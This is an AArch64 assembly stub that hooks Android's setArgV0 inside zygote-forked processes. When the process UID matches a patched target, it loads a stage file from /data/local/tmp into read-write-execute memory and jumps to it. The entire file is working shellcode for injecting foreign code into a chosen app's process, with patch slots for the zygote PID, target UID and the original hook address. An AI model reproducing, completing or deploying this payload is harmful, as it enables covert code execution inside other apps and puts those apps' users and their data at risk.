// Tiny setArgV0 stub: load stage from /data/local/tmp file and branch there.
//
// Register discipline: the hooked setArgV0 must preserve x19-x28 for its
// JNI bridge caller (AArch64 callee-saved). We use only x16/x17 (caller-saved
// IP scratch registers) and x9-x11 as scratch, all of which Linux ARM64
// syscalls preserve across SVC, so x21/x22 of the caller pass through intact.
.text
.global _start
_start:
    sub  sp, sp, #80
    stp  x0, x1, [sp]
    stp  x2, x3, [sp, #16]
    str  x8, [sp, #32]
    str  x30, [sp, #40]
    stp  x29, xzr, [sp, #48]

    mov  x8, #172
    svc  #0
    .word 0x52800001           // patch: movz w1, zygotePid
    cmp  w0, w1
    b.eq _orig

    mov  x8, #174
    svc  #0
    ldr  w9, _target_uid
    cmp  w0, w9
    b.ne _orig

    adr  x0, _stage_path
    mov  x1, x0
    mov  x0, #-100
    mov  x2, #0
    mov  x8, #56
    svc  #0
    mov  x16, x0               // fd (caller-saved scratch)
    cmp  x0, #0
    b.lt _orig

    mov  x0, #0
    mov  x1, #262144
    mov  x2, #7
    mov  x3, #0x22
    mov  x4, #-1
    mov  x5, #0
    mov  x8, #222
    svc  #0
    mov  x17, x0               // stage mmap addr (caller-saved scratch)
    cmp  x0, #-1
    b.eq _close_orig

    mov  x0, x16
    mov  x1, x17
    mov  x2, #262144
    mov  x8, #63
    svc  #0

    mov  x0, x16
    mov  x8, #57
    svc  #0

    // Patch stage absolute slots.
    ldr  x9, _stage_data_off
    add  x10, x17, x9
    ldr  x11, _stage_data_slot_off
    str  x10, [x17, x11]
    ldr  x10, _orig_hook_slot
    ldr  x11, _stage_orig_slot_off
    str  x10, [x17, x11]

    // Restore original call state and branch to stage. x16/x17 are caller-
    // saved so the original caller does not require them to survive.
    ldp  x29, xzr, [sp, #48]
    ldr  x30, [sp, #40]
    ldr  x8, [sp, #32]
    ldp  x2, x3, [sp, #16]
    ldp  x0, x1, [sp]
    add  sp, sp, #80
    br   x17

_close_orig:
    mov  x0, x16
    mov  x8, #57
    svc  #0

_orig:
    ldp  x29, xzr, [sp, #48]
    ldr  x30, [sp, #40]
    ldr  x8, [sp, #32]
    ldp  x2, x3, [sp, #16]
    ldp  x0, x1, [sp]
    add  sp, sp, #80
    ldr  x9, _orig_hook_slot
    br   x9

_target_uid:
    .4byte 0
    .4byte 0
_orig_hook_slot:
    .8byte 0
_stage_data_off:
    .8byte 0
_stage_data_slot_off:
    .8byte 0
_stage_orig_slot_off:
    .8byte 0
_stage_path:
    .space 96, 0x00

    .space 428 - (. - _start), 0x00
